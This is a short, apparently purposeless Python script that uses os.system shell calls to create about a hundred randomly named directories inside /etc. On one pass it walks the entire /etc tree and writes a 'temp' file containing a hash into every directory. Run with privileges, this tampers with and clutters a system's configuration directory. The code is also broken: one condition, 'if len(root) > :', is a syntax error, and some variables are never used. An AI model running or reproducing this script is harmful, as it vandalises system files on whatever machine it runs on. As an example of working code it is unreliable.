#!/usr/bin/env python
#-*- coding: utf-8 -*-

import os,socket,hashlib,random,time
from os import system as command
codes = ['eradawa','nmwp','Plks','ADOiws','ADwkn','12adaw','lñkadm','aweas','ioad']
escape = '/'
ruta = r"/etc"
for i in range(0,100):
    hash = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,10000000000000000000000000000000000000000000000000000000000000000000000000000000))
    hash = hash.encode('utf-8')
    hash = hashlib.sha512(hash)
    hash = hash.hexdigest()
    hashc = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,10000000000000000000000))
    hashc = hashc.encode('utf-8')
    hashc = hashlib.sha512(hashc)
    hashc = hashc.hexdigest()

    if i == 80:
        print("Vale 80")
        command("mkdir %s" % (ruta + escape + hashc + "1Mk41j"))
        for root,directory,archivos in os.walk(ruta):
            if len(root) > :
                print(root)
                command("echo '%s' > %s/temp" % (hash,root))
            else:
                command("echo '%s' > %s/temp" % (hashc,root))
        
    else:
        command("mkdir %s" % (ruta + escape + hashc))
#hash = hash.encode('utf-8')
#hash = hashlib.sha512(hash)
#hash = str(hash.hexdigest())
#with open('temp','w+') as f:
#    f.write(hash+"adkj2")
#with open('temp','r') as f:
#    content = f.read()
#    f.close()
#time.sleep(5)
#os.remove("temp")
#print(content)
    